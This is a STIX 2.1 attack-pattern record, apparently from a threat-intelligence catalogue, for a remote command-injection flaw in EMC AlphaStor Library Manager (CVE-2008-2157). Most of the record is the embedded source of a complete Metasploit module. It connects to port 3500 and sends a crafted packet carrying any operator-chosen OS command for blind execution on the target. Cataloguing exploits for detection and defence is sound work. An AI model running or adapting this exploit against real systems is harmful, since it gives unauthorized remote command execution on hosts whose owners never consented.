{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--de1a3546-093a-4354-93e1-4c67eb672ceb",
    "created": "2024-08-14T16:22:42.245537Z",
    "modified": "2024-08-14T16:22:42.245542Z",
    "name": "EMC AlphaStor Library Manager Arbitrary Command Execution",
    "description": " EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability because the application fails to properly sanitize user-supplied input. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/emc/alphastor_librarymanager_exec.rb",
            "external_id": "alphastor_librarymanager_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2157"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',\n      'Description'    => %q{\n          EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability\n          because the application fails to properly sanitize user-supplied input.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],\n          [ 'CVE', '2008-2157' ],\n          [ 'OSVDB', '45715' ],\n          [ 'BID', '29398' ],\n        ],\n      'DisclosureDate' => '2008-05-27'))\n\n      register_options(\n        [\n          Opt::RPORT(3500),\n          OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt']),\n        ])\n  end\n\n  def run\n    connect\n\n    data = \"\\x75\" + datastore['CMD']\n    pad  = \"\\x00\" * 512\n\n    pkt = data + pad\n\n    # commands are executed blindly.\n    print_status(\"Sending command: #{datastore['CMD']}\")\n    sock.put(pkt)\n\n    select(nil,nil,nil,1)\n\n    sock.get_once\n\n    print_status(\"Executed '#{datastore['CMD']}'...\")\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-27"
}